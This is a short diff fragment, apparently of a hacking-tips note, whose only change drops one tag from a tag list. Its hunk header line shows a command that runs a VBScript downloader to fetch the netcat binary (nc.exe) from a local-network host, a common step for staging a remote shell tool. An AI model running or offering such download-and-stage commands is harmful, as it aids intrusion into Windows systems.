@@ -11,4 +11,4 @@ cscript wget.vbs http://192.168.0.1/nc.exe nc.exe
 
 Tags:
 
-    #assorted #hacking #trick #vbscript
+    #hacking #trick #vbscript 
